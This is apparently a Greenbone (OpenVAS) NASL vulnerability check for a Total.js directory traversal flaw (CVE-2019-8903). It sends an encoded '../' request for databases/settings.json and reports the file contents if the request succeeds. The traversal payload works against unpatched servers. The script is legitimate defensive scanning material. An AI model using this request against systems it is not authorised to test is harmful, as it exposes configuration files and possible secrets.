# SPDX-FileCopyrightText: 2019 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:totaljs:total.js";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142119");
  script_version("2025-03-20T05:38:32+0000");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2019-03-11 14:51:32 +0700 (Mon, 11 Mar 2019)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-03-18 19:15:00 +0000 (Wed, 18 Mar 2020)");

  script_cve_id("CVE-2019-8903");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Total.js Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_totaljs_detect.nasl");
  script_mandatory_keys("totaljs/detected");

  script_tag(name:"summary", value:"Total.js is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"See the vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/");
  script_xref(name:"URL", value:"https://snyk.io/vuln/SNYK-JS-TOTALJS-173710");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/%2e%2e/databases/settings.json";
req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && res =~ '\\{"') {
  report = 'It was possible to obtain the settings.json file at ' +
           http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResponse:\n\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
